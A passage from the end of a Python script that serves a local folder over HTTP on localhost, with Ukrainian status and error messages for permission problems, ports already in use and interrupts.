            print(f"📁 Обслуговуємо папку: {DIRECTORY}")
            print(f"🔗 Сайт доступний за адресою: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"❌ Помилка: Немає прав для запуску на порту {PORT}")
        print("💡 Спробуйте запустити з правами адміністратора або використайте порт 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"❌ Помилка: Порт {PORT} вже використовується")
            print("💡 Зупиніть інший сервер або використайте інший порт")
        else:
            print(f"❌ Помилка запуску сервера: {e}")
    except KeyboardInterrupt:
        print("\n⏹️ Сервер зупинений користувачем")
    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}")

    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}") 
